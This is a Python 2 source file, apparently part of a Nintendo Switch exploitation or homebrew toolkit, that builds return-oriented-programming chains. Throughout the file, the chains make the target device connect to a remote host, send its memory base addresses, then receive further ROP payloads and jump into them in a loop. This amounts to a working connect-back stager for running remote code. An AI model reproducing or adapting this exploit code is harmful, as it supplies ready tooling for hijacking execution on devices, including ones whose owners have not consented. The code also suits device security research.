import Queue as queue
import socket

from rop import Rop, F, G, Ret, data_base, wk_base, main_base
from util import p16

# We have 0x40000 bytes of available memory
# When initial_chain is executed, we cannot use first 0x10000 bytes (they are used for the initial chain)
# After that, this is the layout:
# [0; 0x10000) - static memory - use it across multiple rop calls
# [0x10000; 0x20000) - dynamic memory - used by a single rop call (this is where data_base points to after setup)
# [0x20000; 0x30000) - first rop chain (starts at +0x1000 to ensure stack space for funcs)
# [0x30000; 0x40000) - second rop chain (starts at +0x1000 as well)

SWITCH_MSG_WAITALL = 0x40

RPC_ROP_LEN = 0x8000
RPC_RESPONSE_LEN = 0x8000
RPC_SCRATCH_SIZE = 0x1000

RPC_DYNAMIC_MEM_OFF = 0x10000
RPC_ROP_OFF = 0x20000
RPC_ROP_SIZE = 0x10000

# memory for functions' local vars
RPC_ROP_LOCALS = 0x1000

class Rpc:

    def __init__(self, host, port):
        self.host = host
        self.port = port

        self.cmd_q = queue.Queue(1)
        self.res_q = queue.Queue(1)

    def initial_chain(self):
        """
            This is the first chain executed on switch.

            Its purpose is to send initialization packet to sockserver.
        """
        host = socket.inet_aton(self.host)
        port = socket.htons(self.port)

        rop = Rop()

        sock = rop.alloc(8)

        sockaddr = rop.awrite(
            "\x00\x02" + p16(port) + host +
            "\x00\x00\x00\x00\x00\x00\x00\x00"
        )

        # we send the setup buffer to sockserv, which contains bases of modules and data
        rop.write64(data_base, data_base)
        rop.write64(main_base, data_base + 0x8)
        rop.write64(wk_base, data_base + 0x10)

        rop.call(F.socket, 2, 1, 0)
        rop.store_ret(sock)

        # also store socket fd to setup buffer
        rop.load_ret(sock)
        rop.store_ret(data_base + 0x100)

        rop.load_ret(sock)
        rop.call(F.connect, Ret, sockaddr, 16)
        rop.load_ret(sock)
        # okay now send setup buffer
        rop.call(F.send, Ret, data_base, 0x1000, 0)

        # at this point data_base is pointing at buffer+0x8000
        # just read the rop payload to buffer+0x20000

        new_stack = data_base + (0x20000 - 0x8000) + RPC_ROP_LOCALS

        # recv back the rop payload
        rop.load_ret(sock)
        rop.call(F.recv, Ret, new_stack, RPC_ROP_LEN, SWITCH_MSG_WAITALL) # flags=MSG_WAITALL

        # set up jmp_buf
        rop.write64(new_stack, data_base + 0xF8) # SP
        rop.write64(G.pop_x29_x30, data_base + 0x100) # X30

        # jump into the new payload
        rop.call(F.longjmp, data_base)

        return rop

    def set_args(self, sockfd, buf):
        self.sockfd = sockfd
        self.buf = buf
        self.cur_stack = 1

    def next_payload(self):
        rop = self.cmd_q.get()

        # Send back the result
        rop.call(F.send, self.sockfd, data_base, RPC_RESPONSE_LEN, 0)

        new_stack = self.buf + RPC_ROP_OFF + RPC_ROP_SIZE * self.cur_stack + RPC_ROP_LOCALS
        print "Using stack: 0x{:x}".format(new_stack)
        self.cur_stack = 1 - self.cur_stack

        # Get next payload
        rop.call(F.recv, self.sockfd, new_stack, RPC_ROP_LEN, SWITCH_MSG_WAITALL)

        # set up jmp_buf
        rop.write64(new_stack, data_base + 0xF8) # SP
        rop.write64(G.pop_x29_x30, data_base + 0x100) # X30

        # jump into the new payload
        rop.call(F.longjmp, data_base)

        return rop

    def exec_rop(self, rop):
        self.cmd_q.put(rop)
        return self.res_q.get()
